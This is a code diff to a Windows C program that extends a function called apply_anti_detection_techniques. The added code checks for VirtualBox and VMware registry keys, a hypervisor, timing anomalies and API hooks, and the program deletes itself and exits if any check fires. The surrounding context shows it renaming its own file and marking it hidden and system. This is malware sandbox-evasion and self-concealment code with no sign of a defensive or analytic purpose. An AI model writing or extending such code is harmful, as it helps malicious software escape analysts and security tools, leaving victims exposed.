@@ -59,7 +59,8 @@ static void delete_self(void) {
 void apply_anti_detection_techniques(void) {
     if (is_debugger_present() || is_vm_present() || is_sandbox_present() || 
         check_environment_variables() || check_filesystem_artifacts() || 
-        is_debugger_attached()) {
+        is_debugger_attached() || check_registry_artifacts() || 
+        check_hypervisor() || timing_check() || check_api_hooks()) {
         delete_self();
         ExitProcess(0);
     }
@@ -79,4 +80,19 @@ void apply_anti_detection_techniques(void) {
     strcat(new_name, random_suffix);
     MoveFileA(GetCommandLineA(), new_name);
     SetFileAttributesA(new_name, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
+}
+
+static BOOL check_registry_artifacts(void) {
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Oracle\\VirtualBox", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        RegCloseKey(hKey);
+        return TRUE;
+    }
+
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\VMware, Inc.\\VMware Tools", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        RegCloseKey(hKey);
+        return TRUE;
+    }
+
+    return FALSE;
 }
